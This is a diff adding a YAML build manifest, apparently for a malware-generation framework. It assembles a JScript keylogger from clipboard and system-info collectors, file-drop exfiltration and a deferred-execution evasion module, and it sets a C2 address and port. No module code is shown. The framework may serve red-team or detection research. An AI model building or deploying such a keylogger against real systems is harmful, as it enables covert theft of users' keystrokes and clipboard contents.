@@ -1,0 +1,26 @@
+name: js_keylogger_filedrop
+description: JScript keylogger with file drop exfiltration
+format: jscript
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/sysinfo
+  - collectors/clipboard
+
+keylogger: collectors/keylogger_staged
+
+exfil: exfil/file_drop
+arch: arch/keylogger
+
+evasion:
+  - evasion/deferred_exec
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  KEYLOG_DURATION: "30"
+  EXFIL_FILENAME: "sysdata.log"
